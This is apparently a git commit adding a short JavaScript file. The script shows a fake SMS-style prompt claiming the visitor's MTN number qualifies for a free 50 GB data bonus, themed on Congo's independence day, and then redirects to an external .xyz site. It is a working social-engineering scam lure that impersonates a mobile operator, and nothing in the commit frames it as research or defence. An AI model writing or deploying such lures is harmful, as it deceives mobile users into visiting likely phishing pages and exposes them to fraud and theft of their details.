4a28e345ab1bfb76a6cc6668d890f322d81752ac
newetijazz3 <newetijazz3@gmail.com>
2025-08-14 03:52:42 +0100

    Create congo-independ.js

---
+++ congo-independ.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, votre numéro mtn est éligible pour recevoir 50 Go, appuyez sur OK pour activer maintenant ','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://www.ikimette.xyz/Congo-independence-mtn50gb';
+}
